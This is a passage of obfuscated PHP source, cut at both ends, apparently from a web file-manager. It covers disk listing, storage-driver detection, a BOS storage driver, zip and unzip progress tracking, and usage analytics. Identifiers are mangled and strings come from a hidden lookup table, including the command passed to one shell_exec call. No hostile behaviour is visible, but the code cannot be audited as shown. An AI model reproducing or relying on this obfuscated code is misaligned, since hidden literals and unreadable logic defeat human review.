$¦ğ™¹ÉÜ[1392] . $šò×»±[$¦ğ™¹ÉÜ[484]] . $¦ğ™¹ÉÜ[1380]; } public static function defaultDriverInit() { static $œ„Ò¿§Ñ = false; if ($œ„Ò¿§Ñ) { return $œ„Ò¿§Ñ; } $œ„Ò¿§Ñ = IO::init(self::defaultIO()); return $œ„Ò¿§Ñ; } public static function fileTypeList() { $İÑ„ÌË =& $_SERVER[÷ôÚîå]; $·õëÒÛ€ = $GLOBALS[$İÑ„ÌË[6]][$İÑ„ÌË[1393]]; foreach ($·õëÒÛ€ as $Úıƒ…ûÚ => $±Ììò»À) { $¼Í§èÖƒ = $İÑ„ÌË[1394] . $Úıƒ…ûÚ; $ôÜÓÓï³ = LNG($¼Í§èÖƒ); if ($¼Í§èÖƒ != $ôÜÓÓï³) { $·õëÒÛ€[$Úıƒ…ûÚ][$İÑ„ÌË[32]] = $ôÜÓÓï³; } } return $·õëÒÛ€; } public static function diskList($ÑĞ‰ç = true) { $¯ıÇ÷˜· = $_SERVER[÷ôÚîå][1395]; if ($ÑĞ‰ç) { $àƒÁÀı = Cache::get($¯ıÇ÷˜·); if (is_array($àƒÁÀı)) { return $àƒÁÀı; } } $àƒÁÀı = self::diskListGet(); Cache::set($¯ıÇ÷˜·, $àƒÁÀı, 60); return $àƒÁÀı; } public static function diskListGet() { $İâ—­¦£ =& $_SERVER[÷ôÚîå]; $™÷èØŠ = array(); if ($GLOBALS[$İâ—­¦£[6]][$İâ—­¦£[1396]] == $İâ—­¦£[1397]) { $ÆÁı÷é† = $İâ—­¦£[1398]; for ($à²î¥«Æ = 0; $à²î¥«Æ < strlen($ÆÁı÷é†); $à²î¥«Æ++) { $¤óìèš¡ = $ÆÁı÷é†[$à²î¥«Æ] . $İâ—­¦£[1399]; if (file_exists($¤óìèš¡)) { $™÷èØŠ[] = $¤óìèš¡; } } return $™÷èØŠ; } if (!function_exists($İâ—­¦£[111])) { $™÷èØŠ[] = $İâ—­¦£[925]; return $™÷èØŠ; } $ÌğÚ†õ† = explode($İâ—­¦£[65], shell_exec($İâ—­¦£[1400])); array_shift($ÌğÚ†õ†); array_pop($ÌğÚ†õ†); $‘ö‡ºİÔ = array($İâ—­¦£[1401], $İâ—­¦£[1402], $İâ—­¦£[1403], $İâ—­¦£[1404], $İâ—­¦£[1405], $İâ—­¦£[1406], $İâ—­¦£[1407], $İâ—­¦£[1408]); foreach ($ÌğÚ†õ† as $ÒÌÆ¾Ö­) { $İ‡¬ô•™ = preg_split($İâ—­¦£[1409], $ÒÌÆ¾Ö­); $¤óìèš¡ = $İ‡¬ô•™[count($İ‡¬ô•™) - 1]; if (!strstr($İ‡¬ô•™[0], $İâ—­¦£[1410]) || !$¤óìèš¡) { continue; } $«’ˆ®Ç¼ = rtrim($¤óìèš¡, $İâ—­¦£[8]) . $İâ—­¦£[8]; if (in_array($«’ˆ®Ç¼, $‘ö‡ºİÔ)) { continue; } $™÷èØŠ[] = $«’ˆ®Ç¼; } return $™÷èØŠ; } public static function isSameDisk($ÍÌ„¹Ğé, $¸Ÿù·Ó‘) { $ÚÆÆ’™¢ =& $_SERVER[÷ôÚîå]; if ($GLOBALS[$ÚÆÆ’™¢[6]][$ÚÆÆ’™¢[1396]] == $ÚÆÆ’™¢[1397]) { return strtolower(substr($ÍÌ„¹Ğé, 0, 1)) == strtolower(substr($¸Ÿù·Ó‘, 0, 1)); } $Š—×ƒ”¦ = self::diskList(); $Ñ½ñı ê = !1; $£˜á¾· = !1; sort($Š—×ƒ”¦); $Š—×ƒ”¦ = array_reverse($Š—×ƒ”¦); $ÍÌ„¹Ğé = rtrim($ÍÌ„¹Ğé, $ÚÆÆ’™¢[8]) . $ÚÆÆ’™¢[8]; $¸Ÿù·Ó‘ = rtrim($¸Ÿù·Ó‘, $ÚÆÆ’™¢[8]) . $ÚÆÆ’™¢[8]; foreach ($Š—×ƒ”¦ as $…±Ã¼†») { $Àãš×¢ = strlen($…±Ã¼†»); if (!$Ñ½ñı ê && substr($ÍÌ„¹Ğé, 0, $Àãš×¢) == $…±Ã¼†») { $Ñ½ñı ê = $…±Ã¼†»; } if (!$£˜á¾· && substr($¸Ÿù·Ó‘, 0, $Àãš×¢) == $…±Ã¼†») { $£˜á¾· = $…±Ã¼†»; } if ($Ñ½ñı ê && $£˜á¾·) { break; } } return $Ñ½ñı ê === $£˜á¾·; } public static function transferType($æ‰µÀ¯ş, $³…÷ŒÙ) { $Ú‚Ø€ô£ =& $_SERVER[÷ôÚîå]; $¾ŸÇÂ¦ = self::driverType($æ‰µÀ¯ş); $¥ï”Ì÷• = self::driverType($³…÷ŒÙ); if ($¾ŸÇÂ¦[$Ú‚Ø€ô£[33]] == $¥ï”Ì÷•[$Ú‚Ø€ô£[33]] && $¾ŸÇÂ¦[$Ú‚Ø€ô£[1411]] == $¥ï”Ì÷•[$Ú‚Ø€ô£[1411]]) { return $Ú‚Ø€ô£[1412]; } if ($¾ŸÇÂ¦[$Ú‚Ø€ô£[33]] == $Ú‚Ø€ô£[958] && $¥ï”Ì÷•[$Ú‚Ø€ô£[33]] == $Ú‚Ø€ô£[119]) { return $Ú‚Ø€ô£[1290]; } if ($¾ŸÇÂ¦[$Ú‚Ø€ô£[33]] == $Ú‚Ø€ô£[119] && $¥ï”Ì÷•[$Ú‚Ø€ô£[33]] == $Ú‚Ø€ô£[958]) { return $Ú‚Ø€ô£[120]; } return $Ú‚Ø€ô£[1413]; } public static function driverType($Æü¦ü) { $Û‘‘êå =& $_SERVER[÷ôÚîå]; $å·ğß²É = str_replace($Û‘‘êå[1414], $Û‘‘êå[12], strtolower($Æü¦ü->getType())); if ($å·ğß²É == $Û‘‘êå[846] || $å·ğß²É == $Û‘‘êå[1415] || $å·ğß²É == $Û‘‘êå[1416]) { $Æü¦ü = self::defaultDriverInit(); } else { if ($å·ğß²É == $Û‘‘êå[1300] || $å·ğß²É == $Û‘‘êå[1417]) { $Æü¦ü = IO::init($Æü¦ü->pathParse[$Û‘‘êå[1243]]); } } $‰áöÓ = $Æü¦ü->path; $å·ğß²É = str_replace($Û‘‘êå[1414], $Û‘‘êå[12], strtolower($Æü¦ü->getType())); if ($å·ğß²É == $Û‘‘êå[119]) { return array($Û‘‘êå[33] => $Û‘‘êå[119], $Û‘‘êå[1411] => $Û‘‘êå[12], $Û‘‘êå[97] => $‰áöÓ, $Û‘‘êå[108] => $Æü¦ü); } return array($Û‘‘êå[33] => $Û‘‘êå[958], $Û‘‘êå[1411] => $Æü¦ü->pathDriver, $Û‘‘êå[97] => $‰áöÓ, $Û‘‘êå[108] => $Æü¦ü); } public static function pathDriverType($ÃÌä¼üè) { return $ÃÌä¼üè ? self::driverType(IO::init($ÃÌä¼üè)) : !1; } public static function pathDriverLocal($‘Áà«‰µ) { $©Ğûˆ³ˆ =& $_SERVER[÷ôÚîå]; $Š®¶¼„È = $‘Áà«‰µ ? self::driverType(IO::init($‘Áà«‰µ)) : !1; return strtolower($Š®¶¼„È[$©Ğûˆ³ˆ[33]]) == $©Ğûˆ³ˆ[119] ? !0 : !1; } public static function allowCover($ÒµŠøü³, $õçç­´é = true) { $™Ò“Õş =& $_SERVER[÷ôÚîå]; if (is_string($ÒµŠøü³)) { $ÒµŠøü³ = IO::info($ÒµŠøü³); } if (!$ÒµŠøü³ || $ÒµŠøü³[$™Ò“Õş[33]] == $™Ò“Õş[88] || $ÒµŠøü³[$™Ò“Õş[89]] <= 100) { return !1; } if (isset($ÒµŠøü³[$™Ò“Õş[1418]]) || !$ÒµŠøü³[$™Ò“Õş[97]]) { return !1; } if (isset($ÒµŠøü³[$™Ò“Õş[242]]) && !$ÒµŠøü³[$™Ò“Õş[242]]) { return !1; } static $“äïø = false; if (!$“äïø || !$õçç­´é) { $ÓáĞ¦±à = self::driverType(IO::init($ÒµŠøü³[$™Ò“Õş[97]])); $¹‘Şôì = $ÓáĞ¦±à[$™Ò“Õş[108]]; $“äïø = $™Ò“Õş[206]; if ($ÓáĞ¦±à[$™Ò“Õş[33]] == $™Ò“Õş[119]) { $“äïø = $™Ò“Õş[1419]; } if ($ÓáĞ¦±à[$™Ò“Õş[108]] && is_array($ÓáĞ¦±à[$™Ò“Õş[108]]->config)) { $×á¦ˆŸ„ = $ÓáĞ¦±à[$™Ò“Õş[108]]->config; if (isset($×á¦ˆŸ„[$™Ò“Õş[1420]]) && $×á¦ˆŸ„[$™Ò“Õş[1420]]) { $“äïø = $™Ò“Õş[1419]; } } $Ñ›Ü™ˆó = KodIO::defaultDriver(); if (strtolower($Ñ›Ü™ˆó[$™Ò“Õş[108]]) == $™Ò“Õş[119] && is_array($Ñ›Ü™ˆó[$™Ò“Õş[6]])) { $õóÚ’ãæ = $Ñ›Ü™ˆó[$™Ò“Õş[6]][$™Ò“Õş[1273]]; if (substr($õóÚ’ãæ, 0, 2) == $™Ò“Õş[1421]) { $õóÚ’ãæ = str_replace($™Ò“Õş[1421], BASIC_PATH, $õóÚ’ãæ); } $õóÚ’ãæ = str_replace($™Ò“Õş[601], $™Ò“Õş[8], $õóÚ’ãæ); if (substr($ÒµŠøü³[$™Ò“Õş[97]], 0, strlen($õóÚ’ãæ)) == $õóÚ’ãæ) { $“äïø = $™Ò“Õş[206]; } } } return $“äïø == $™Ò“Õş[1419] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($–‘øŒÈë) { parent::__construct($–‘øŒÈë); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($ş˜ÕãÄ¡) { $ÉÊ†’óÄ =& $_SERVER[÷ôÚîå]; if (substr($ş˜ÕãÄ¡, 0, 7) == $ÉÊ†’óÄ[322]) { $ş˜ÕãÄ¡ = $ÉÊ†’óÄ[323] . substr($ş˜ÕãÄ¡, 7); } header($ÉÊ†’óÄ[185] . $ş˜ÕãÄ¡); die; } } goto f¾Í®¯¶ó‘; C¤É¢Ë‹‰ğ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¶ùê©öŒ =& $_SERVER[÷ôÚîå]; parent::startAfter(); Hook::bind($¶ùê©öŒ[1892], array($this, $¶ùê©öŒ[1893])); Hook::bind($¶ùê©öŒ[1289], array($this, $¶ùê©öŒ[1894])); Hook::bind($¶ùê©öŒ[1895], array($this, $¶ùê©öŒ[1896])); $µşô©ì =& $this->task; $µşô©ì[$¶ùê©öŒ[1897]] = $¶ùê©öŒ[1290]; if (!$µşô©ì[$¶ùê©öŒ[1668]]) { $µşô©ì[$¶ùê©öŒ[1668]] = LNG($¶ùê©öŒ[1898]); } } protected function endAfter() { $£Ãê“¨ =& $_SERVER[÷ôÚîå]; parent::endAfter(); Hook::unbind($£Ãê“¨[1892], array($this, $£Ãê“¨[1893])); Hook::unbind($£Ãê“¨[1289], array($this, $£Ãê“¨[1894])); Hook::unbind($£Ãê“¨[1895], array($this, $£Ãê“¨[1896])); } public function updateAfter() { $åäÕ…é¼ =& $_SERVER[÷ôÚîå]; $Î§ğ¸ìÇ =& $this->task; if (!$Î§ğ¸ìÇ[$åäÕ…é¼[1152]] || !$Î§ğ¸ìÇ[$åäÕ…é¼[852]]) { if ($Î§ğ¸ìÇ[$åäÕ…é¼[1897]] != $åäÕ…é¼[398]) { return; } } if ($Î§ğ¸ìÇ[$åäÕ…é¼[1897]] == $åäÕ…é¼[1290]) { $‘Î²çø… = 0; if ($Î§ğ¸ìÇ[$åäÕ…é¼[1832]]) { $‘Î²çø… = $Î§ğ¸ìÇ[$åäÕ…é¼[1833]] / $Î§ğ¸ìÇ[$åäÕ…é¼[1832]]; } $Î§ğ¸ìÇ[$åäÕ…é¼[1781]] = $‘Î²çø… * 0.3; } else { if ($Î§ğ¸ìÇ[$åäÕ…é¼[1897]] == $åäÕ…é¼[398]) { $‘Î²çø… = $Î§ğ¸ìÇ[$åäÕ…é¼[1780]] / $Î§ğ¸ìÇ[$åäÕ…é¼[1152]]; $Î§ğ¸ìÇ[$åäÕ…é¼[1781]] = 0.3 + $‘Î²çø… * 0.4; } else { if ($Î§ğ¸ìÇ[$åäÕ…é¼[1897]] == $åäÕ…é¼[120]) { $³¦¢ÀÆ… = 0; if ($Î§ğ¸ìÇ[$åäÕ…é¼[1834]] == $åäÕ…é¼[120]) { $³¦¢ÀÆ… = $Î§ğ¸ìÇ[$åäÕ…é¼[1833]]; } $‘Î²çø… = ($Î§ğ¸ìÇ[$åäÕ…é¼[1837]] + $³¦¢ÀÆ…) / $Î§ğ¸ìÇ[$åäÕ…é¼[852]]; $Î§ğ¸ìÇ[$åäÕ…é¼[1781]] = 0.3 + 0.4 + $‘Î²çø… * 0.3; } } } if ($Î§ğ¸ìÇ[$åäÕ…é¼[1781]] > 0) { $ı‹Ë«‹ = timeFloat() - $Î§ğ¸ìÇ[$åäÕ…é¼[1783]] - $Î§ğ¸ìÇ[$åäÕ…é¼[1786]]; $Î§ğ¸ìÇ[$åäÕ…é¼[1787]] = $ı‹Ë«‹ * (1 - $Î§ğ¸ìÇ[$åäÕ…é¼[1781]]) / $Î§ğ¸ìÇ[$åäÕ…é¼[1781]]; } } public function addFile($ÚÚÓ¹¿) { $šØº¸ã‰ =& $_SERVER[÷ôÚîå]; $şÀÊê°Á =& $this->task; $Üòíø¼ = IO::info($ÚÚÓ¹¿); $şÀÊê°Á[$šØº¸ã‰[1830]] = $Üòíø¼[$šØº¸ã‰[32]]; $şÀÊê°Á[$šØº¸ã‰[1832]] = $Üòíø¼[$šØº¸ã‰[89]]; $şÀÊê°Á[$šØº¸ã‰[1833]] = 0; $şÀÊê°Á[$šØº¸ã‰[1154]] = $šØº¸ã‰[1853]; $şÀÊê°Á[$šØº¸ã‰[1834]] = $šØº¸ã‰[1290]; $şÀÊê°Á[$šØº¸ã‰[852]] = $Üòíø¼[$šØº¸ã‰[89]]; $şÀÊê°Á[$šØº¸ã‰[1152]] = 1; $¹ùÕò– = 0; $şÀÊê°Á[$šØº¸ã‰[1841]] = array($šØº¸ã‰[1842] => $¹ùÕò– + 1, $šØº¸ã‰[503] => $Üòíø¼[$šØº¸ã‰[32]], $šØº¸ã‰[97] => $Üòíø¼[$šØº¸ã‰[97]], $šØº¸ã‰[591] => $Üòíø¼[$šØº¸ã‰[591]] ? $Üòíø¼[$šØº¸ã‰[591]] : $Üòíø¼[$šØº¸ã‰[97]]); $this->update(); } public function zipEvent($÷™™«Ë», $•±öôåÛ, $‹Ğ„ôÍé, $…ƒì÷é) { $Ş„ñùŒº =& $_SERVER[÷ôÚîå]; $Öš™Åô =& $this->task; $Öš™Åô[$Ş„ñùŒº[1830]] = get_path_this($•±öôåÛ); $Öš™Åô[$Ş„ñùŒº[1832]] = $…ƒì÷é; $Öš™Åô[$Ş„ñùŒº[1833]] = $‹Ğ„ôÍé; $Öš™Åô[$Ş„ñùŒº[1154]] = $÷™™«Ë» == $Ş„ñùŒº[1899] ? $Ş„ñùŒº[1900] : $Ş„ñùŒº[1901]; $Öš™Åô[$Ş„ñùŒº[1834]] = $Ş„ñùŒº[12]; $Öš™Åô[$Ş„ñùŒº[852]] = $…ƒì÷é; $Öš™Åô[$Ş„ñùŒº[1897]] = $Ş„ñùŒº[398]; $this->update(); } public function unzipAfter($•ëğ—¡µ) { $û¹€ú÷µ =& $_SERVER[÷ôÚîå]; $¶ÒüÖåÃ =& $this->task; $¶ÒüÖåÃ[$û¹€ú÷µ[1897]] = $û¹€ú÷µ[120]; $µÁàñ¢ë = IO::infoWithChildren($•ëğ—¡µ); $¬‹áãã³ = 0; $¶ÒüÖåÃ[$û¹€ú÷µ[1841]] = array($û¹€ú÷µ[1842] => $¬‹áãã³ + 1, $û¹€ú÷µ[503] => $µÁàñ¢ë[$û¹€ú÷µ[32]], $û¹€ú÷µ[97] => $µÁàñ¢ë[$û¹€ú÷µ[97]], $û¹€ú÷µ[591] => $µÁàñ¢ë[$û¹€ú÷µ[591]] ? $µÁàñ¢ë[$û¹€ú÷µ[591]] : $µÁàñ¢ë[$û¹€ú÷µ[97]]); if ($µÁàñ¢ë[$û¹€ú÷µ[33]] == $û¹€ú÷µ[240]) { $¶ÒüÖåÃ[$û¹€ú÷µ[1152]] = 1; } else { $¶ÒüÖåÃ[$û¹€ú÷µ[1152]] = $µÁàñ¢ë[$û¹€ú÷µ[92]][$û¹€ú÷µ[90]]; } $¶ÒüÖåÃ[$û¹€ú÷µ[1154]] = $û¹€ú÷µ[12]; $¶ÒüÖåÃ[$û¹€ú÷µ[1834]] = 0; $¶ÒüÖåÃ[$û¹€ú÷µ[1780]] = 0; $¶ÒüÖåÃ[$û¹€ú÷µ[1832]] = 0; $¶ÒüÖåÃ[$û¹€ú÷µ[1833]] = 0; $¶ÒüÖåÃ[$û¹€ú÷µ[1830]] = $û¹€ú÷µ[12]; $¶ÒüÖåÃ[$û¹€ú÷µ[1837]] = 0; $¶ÒüÖåÃ[$û¹€ú÷µ[852]] = $µÁàñ¢ë[$û¹€ú÷µ[89]]; $this->update(); self::log($û¹€ú÷µ[1902] . json_encode(array($¶ÒüÖåÃ, $µÁàñ¢ë))); } public function nameParse($„¬Ìƒ­) { $¿Û‡‘³… =& $_SERVER[÷ôÚîå]; $­¨­µ„ =& $this->task; if ($­¨­µ„[$¿Û‡‘³…[1897]] == $¿Û‡‘³…[1290]) { $­¨­µ„[$¿Û‡‘³…[1897]] = $¿Û‡‘³…[398]; $­¨­µ„[$¿Û‡‘³…[1837]] = 0; $­¨­µ„[$¿Û‡‘³…[852]] = 0; } $û£¨ôÚŒ = get_path_this($„¬Ìƒ­); if (strstr($û£¨ôÚŒ, $¿Û‡‘³…[10])) { $­¨­µ„[$¿Û‡‘³…[1780]] += 1; $­¨­µ„[$¿Û‡‘³…[1152]] += 1; } $­¨­µ„[$¿Û‡‘³…[1830]] = $„¬Ìƒ­; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Øğ›†ÍÆ =& $_SERVER[÷ôÚîå]; parent::startAfter(); Hook::bind($Øğ›†ÍÆ[1903], array($this, $Øğ›†ÍÆ[1893])); Hook::bind($Øğ›†ÍÆ[1895], array($this, $Øğ›†ÍÆ[1896])); $“‡òÂµ¤ =& $this->task; $“‡òÂµ¤[$Øğ›†ÍÆ[1897]] = $Øğ›†ÍÆ[1290]; if (!$“‡òÂµ¤[$Øğ›†ÍÆ[1668]]) { $“‡òÂµ¤[$Øğ›†ÍÆ[1668]] = LNG($Øğ›†ÍÆ[1904]); } } protected function endAfter() { $®¸«İ›‹ =& $_SERVER[÷ôÚîå]; parent::endAfter(); Hook::unbind($®¸«İ›‹[1903], array($this, $®¸«İ›‹[1893])); Hook::unbind($®¸«İ›‹[1895], array($this, $®¸«İ›‹[1896])); } public function updateAfter() { $Š¾Ùâë =& $_SERVER[÷ôÚîå]; $”Û‡šÆ² =& $this->task; if (!$”Û‡šÆ²[$Š¾Ùâë[1152]] || !$”Û‡šÆ²[$Š¾Ùâë[852]]) { return; } if ($”Û‡šÆ²[$Š¾Ùâë[1897]] == $Š¾Ùâë[1290]) { $ÊİÛº‰¦ = $”Û‡šÆ²[$Š¾Ùâë[1833]]; if ($”Û‡šÆ²[$Š¾Ùâë[1834]] != $Š¾Ùâë[1290]) { $ÊİÛº‰¦ = 0; } $ÏÚîôÙÀ = ($”Û‡šÆ²[$Š¾Ùâë[1837]] + $ÊİÛº‰¦) / $”Û‡šÆ²[$Š¾Ùâë[852]]; $”Û‡šÆ²[$Š¾Ùâë[1781]] = $ÏÚîôÙÀ * 0.3; } else { if ($”Û‡šÆ²[$Š¾Ùâë[1897]] == $Š¾Ùâë[398]) { $ÏÚîôÙÀ = $”Û‡šÆ²[$Š¾Ùâë[1780]] / $”Û‡šÆ²[$Š¾Ùâë[1152]]; $”Û‡šÆ²[$Š¾Ùâë[1781]] = 0.3 + $ÏÚîôÙÀ * 0.5; } else { if ($”Û‡šÆ²[$Š¾Ùâë[1897]] == $Š¾Ùâë[120]) { $ÏÚîôÙÀ = 0; if ($”Û‡šÆ²[$Š¾Ùâë[1832]]) { $ÏÚîôÙÀ = $”Û‡šÆ²[$Š¾Ùâë[1833]] / $”Û‡šÆ²[$Š¾Ùâë[1832]]; } $”Û‡šÆ²[$Š¾Ùâë[1781]] = 0.3 + 0.5 + $ÏÚîôÙÀ * 0.2; } } } if ($”Û‡šÆ²[$Š¾Ùâë[1781]] > 0) { $ÏãÑÑˆí = timeFloat() - $”Û‡šÆ²[$Š¾Ùâë[1783]] - $”Û‡šÆ²[$Š¾Ùâë[1786]]; $”Û‡šÆ²[$Š¾Ùâë[1787]] = $ÏãÑÑˆí * (1 - $”Û‡šÆ²[$Š¾Ùâë[1781]]) / $”Û‡šÆ²[$Š¾Ùâë[1781]]; } } public function copyFileStart($ö¢ê¤„¯, $›¤ğİùâ, $Åß¨ãŸ, $ÛÚ—§Í, $ĞÁ³µ¸, $²¸ÁĞ¶É) { $üİöşûı =& $_SERVER[÷ôÚîå]; parent::copyFileStart($ö¢ê¤„¯, $›¤ğİùâ, $Åß¨ãŸ, $ÛÚ—§Í, $ĞÁ³µ¸, $²¸ÁĞ¶É); $Ù’Øú”‘ =& $this->task; if ($Ù’Øú”‘[$üİöşûı[1897]] == $üİöşûı[398]) { $Ù’Øú”‘[$üİöşûı[1897]] = $üİöşûı[120]; } $this->update(); } public function copyFileEnd($÷‰×—ô, $¸åŸ¤÷, $ùå¾€ÍÚ, $†ı²ü¡Ÿ, $±òİ½•, $üºÔÌİŸ) { $í³©¥è¶ =& $_SERVER[÷ôÚîå]; $·‘œ«·È =& $this->task; $·‘œ«·È[$í³©¥è¶[1833]] = $·‘œ«·È[$í³©¥è¶[1832]]; $·‘œ«·È[$í³©¥è¶[1837]] += $·‘œ«·È[$í³©¥è¶[1832]]; $·‘œ«·È[$í³©¥è¶[1834]] = $í³©¥è¶[12]; $this->update(); } public function zipEvent($¡ø÷ç‘ò, $á”ê²é½, $¼ìÉŒ˜ò, $‰Ö¸Ú±ö) { $ƒø—·ûó =& $_SERVER[÷ôÚîå]; $áà¢Å¿ê =& $this->task; $áà¢Å¿ê[$ƒø—·ûó[1830]] = get_path_this($á”ê²é½); $áà¢Å¿ê[$ƒø—·ûó[1832]] = $‰Ö¸Ú±ö; $áà¢Å¿ê[$ƒø—·ûó[1833]] = $¼ìÉŒ˜ò; $áà¢Å¿ê[$ƒø—·ûó[1154]] = $¡ø÷ç‘ò == $ƒø—·ûó[1905] ? $ƒø—·ûó[1900] : $ƒø—·ûó[1901]; $áà¢Å¿ê[$ƒø—·ûó[1834]] = $ƒø—·ûó[12]; $áà¢Å¿ê[$ƒø—·ûó[852]] = $‰Ö¸Ú±ö; $áà¢Å¿ê[$ƒø—·ûó[1897]] = $ƒø—·ûó[398]; $this->update(); } public function nameParse($¸ÌŸ¨øÔ) { $ˆîåø²… =& $_SERVER[÷ôÚîå]; $„‡Ê•úÉ =& $this->task; if ($„‡Ê•úÉ[$ˆîåø²…[1780]] < $„‡Ê•úÉ[$ˆîåø²…[1152]]) { $¸ıú¸ºÌ = get_path_this($¸ÌŸ¨øÔ); if (strstr($¸ıú¸ºÌ, $ˆîåø²…[10])) { $„‡Ê•úÉ[$ˆîåø²…[1780]] += 1; } } if ($„‡Ê•úÉ[$ˆîåø²…[1897]] == $ˆîåø²…[1290]) { $„‡Ê•úÉ[$ˆîåø²…[1897]] = $ˆîåø²…[398]; } $„‡Ê•úÉ[$ˆîåø²…[1830]] = $¸ÌŸ¨øÔ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Çşëî‘) { $­·ŞşÉ =& $_SERVER[÷ôÚîå]; $£…øÄÚ÷ = array($­·ŞşÉ[671] => array($­·ŞşÉ[33] => $­·ŞşÉ[1906], $­·ŞşÉ[359] => array($­·ŞşÉ[265], $­·ŞşÉ[854], $­·ŞşÉ[1907], $­·ŞşÉ[1908])), $­·ŞşÉ[1909] => array($­·ŞşÉ[33] => $­·ŞşÉ[1910], $­·ŞşÉ[359] => array($­·ŞşÉ[265], $­·ŞşÉ[852], $­·ŞşÉ[1911], $­·ŞşÉ[1912], $­·ŞşÉ[1913]))); if (!isset($£…øÄÚ÷[$Çşëî‘])) { return !1; } $this->optionType = $£…øÄÚ÷[$Çşëî‘][$­·ŞşÉ[33]]; $this->field = $£…øÄÚ÷[$Çşëî‘][$­·ŞşÉ[359]]; return !0; } public function listData($®°ôæ„ = false, $‚§¾‰Ï® = "\155\157\x64\151\146\171\x54\x69\155\x65", $õ›”“ôä = false) { return parent::listData($®°ôæ„, $‚§¾‰Ï®, $õ›”“ôä); } public function trendList($¢Ä¬ÀØí) { $•È÷Åáì =& $_SERVER[÷ôÚîå]; $¡’¶Ã÷ş = $this->listData(); if ($¡’¶Ã÷ş) { $ÍØëÔ»— = end($¡’¶Ã÷ş); $¥ı—É‰Å = date($•È÷Åáì[1914], strtotime($•È÷Åáì[1915])); if ($ÍØëÔ»—[$•È÷Åáì[265]] == $¥ı—É‰Å) { return $¡’¶Ã÷ş; } $—°Ğ®Šï = strtotime($ÍØëÔ»—[$•È÷Åáì[265]]); } if (!isset($—°Ğ®Šï)) { $àØ÷¯ÙØ = $¢Ä¬ÀØí == $•È÷Åáì[671] ? $•È÷Åáì[607] : $•È÷Åáì[914]; $—°Ğ®Šï = Model($àØ÷¯ÙØ)->min($•È÷Åáì[241]); } $¤÷¿±¬œ = $•È÷Åáì[1916] . ucfirst($¢Ä¬ÀØí); $„á™á¶Š = $this->dateList($—°Ğ®Šï); foreach ($„á™á¶Š as $¥ı—É‰Å) { $this->{$¤÷¿±¬œ}($¥ı—É‰Å); } return $this->listData(); } private function dateList($ãí®®äÙ) { $ŞŒÍ”æõ =& $_SERVER[÷ôÚîå]; $ğÛ¾Ş‘‘ = $ãí®®äÙ; $‘ê™’óà = strtotime($ŞŒÍ”æõ[1915]); $…í†×œ‘ = array(); while ($ğÛ¾Ş‘‘ <= $‘ê™’óà) { $…í†×œ‘[] = date($ŞŒÍ”æõ[1914], $ğÛ¾Ş‘‘); $ğÛ¾Ş‘‘ = strtotime($ŞŒÍ”æõ[1917], $ğÛ¾Ş‘‘); } return $…í†×œ‘; } public function _recordUser($Ëœ®ËŞÃ = '') { $Äªõğ†± =& $_SERVER[÷ôÚîå]; $ë€’è¨… = strtotime(date($Äªõğ†±[1918], strtotime($Ëœ®ËŞÃ))); $¸æ§º˜ó = strtotime(date($Äªõğ†±[1919], strtotime($Ëœ®ËŞÃ))); $ËÛÃ¨®ğ = array($Äªõğ†±[241] => array($Äªõğ†±[1102], $¸æ§º˜ó)); $ô›²„Ëá = Model($Äªõğ†±[607])->where($ËÛÃ¨®ğ)->count($Äªõğ†±[1779]); $ËÛÃ¨®ğ[$Äªõğ†±[241]] = array($Äªõğ†±[418], array($ë€’è¨…, $¸æ§º˜ó)); $É—Ì€´ = Model($Äªõğ†±[607])->where($ËÛÃ¨®ğ)->count($Äªõğ†±[1779]); $ËÛÃ¨®ğ[$Äªõğ†±[33]] = $Äªõğ†±[1920]; $ë·²³¤ = Model($Äªõğ†±[1921])->where($ËÛÃ¨®ğ)->count($Äªõğ†±[1922]); $äÂ­·•ç = array($Äªõğ†±[265] => $Ëœ®ËŞÃ, $Äªõğ†±[854] => (int) $ô›²„Ëá, $Äªõğ†±[1907] => (int) $É—Ì€´, $Äªõğ†±[1908] => (int) $ë·²³¤); return $this->insert($äÂ­·•ç); } public function _recordStore($Ù“¾úêİ = '') { $ôœı–Ë• =& $_SERVER[÷ôÚîå]; $òòÀÏ‰ = strtotime(date($ôœı–Ë•[1919], strtotime($Ù“¾úêİ))); $Ï‚Ôß = array($ôœı–Ë•[241] => array($ôœı–Ë•[1102], $òòÀÏ‰)); $ÃÕÍ¼§Ç = Model($ôœı–Ë•[553])->where($Ï‚Ôß)->sum($ôœı–Ë•[89]); $Ï‚Ôß[$ôœı–Ë•[494]] = 0; $Ç¥¹Ûğß = Model($ôœı–Ë•[914])->where($Ï‚Ôß)->sum($ôœı–Ë•[89]); $Ï‚Ôß[$ôœı–Ë•[200]] = 1; $èÇ´·¯ = Model($ôœı–Ë•[914])->where($Ï‚Ôß)->sum($ôœı–Ë•[89]); $Ï‚Ôß[$ôœı–Ë•[200]] = 2; $¥Àø¶÷¸ = Model($ôœı–Ë•[914])->where($Ï‚Ôß)->sum($ôœı–Ë•[89]); $Á„ë’¶Ô = array($ôœı–Ë•[265] => $Ù“¾úêİ, $ôœı–Ë•[852] => (int) $Ç¥¹Ûğß, $ôœı–Ë•[1911] => (int) $ÃÕÍ¼§Ç, $ôœı–Ë•[1912] => (int) $èÇ´·¯, $ôœı–Ë•[1913] => (int) $¥Àø¶÷¸); return $this->insert($Á„ë’¶Ô); } public function trend($´ËêÈß, $òšæÇ¾×) { $Ö˜ÂÙ•¥ =& $_SERVER[÷ôÚîå]; if (!$this->init($´ËêÈß)) { return !1; } $âµ§åŸ = $this->trendList($´ËêÈß); if ($âµ§åŸ && $òšæÇ¾× != $Ö˜ÂÙ•¥[1752]) { $œ©ôó»° = $âµ§åŸ[0][$Ö˜ÂÙ•¥[265]]; $¼¼®ŞçÉ = $this->validDate($òšæÇ¾×, $œ©ôó»°); $õ¢Äõ–È = array(); $áëğòóé = array_to_keyvalue($âµ§åŸ, $Ö˜ÂÙ•¥[265]); foreach ($¼¼®ŞçÉ as $øíä¼óú) { if (isset($áëğòóé[$øíä¼óú])) { $…ŸËí¯ù = $áëğòóé[$øíä¼óú]; } else { $…ŸËí¯ù = end($âµ§åŸ); $…ŸËí¯ù[$Ö˜ÂÙ•¥[265]] = $øíä¼óú; if ($´ËêÈß == $Ö˜ÂÙ•¥[671]) { $…ŸËí¯ù[$Ö˜ÂÙ•¥[1907]] = 